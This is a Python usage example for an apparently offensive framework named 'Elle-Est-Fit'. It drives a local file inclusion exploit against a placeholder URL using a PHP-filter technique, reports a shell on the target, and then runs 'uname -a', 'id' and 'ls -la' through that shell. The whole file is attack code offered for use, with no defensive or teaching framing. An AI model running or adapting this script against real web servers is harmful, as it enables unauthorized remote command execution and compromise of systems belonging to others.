#!/usr/bin/env python3
"""
Basic usage example for the Elle-Est-Fit framework.
"""

from elle_est_fit import LFI, info

def main():
    """Demonstrate basic usage of the Elle-Est-Fit framework."""
    # Replace with a real target URL or use the custom leak function approach
    target_url = "http://vulnerable-example.com/?page={}"
    
    print("[*] Initializing Elle-Est-Fit...")
    lfi = LFI(
        target=target_url,
        technique="php_filters",
        verbose=True
    )
    
    print("[*] Attempting to exploit LFI vulnerability...")
    if lfi.exploit():
        info(f"Exploitation successful! Shell established at {lfi.shell_path}")
        
        # Execute some commands
        print("\n--- System Information ---")
        output = lfi.shell("uname -a")
        print(output)
        
        print("\n--- Current User ---")
        output = lfi.shell("id")
        print(output)
        
        print("\n--- Directory Listing ---")
        output = lfi.shell("ls -la")
        print(output)
    else:
        info("Exploitation failed. Try a different technique or target.")

if __name__ == "__main__":
    main()
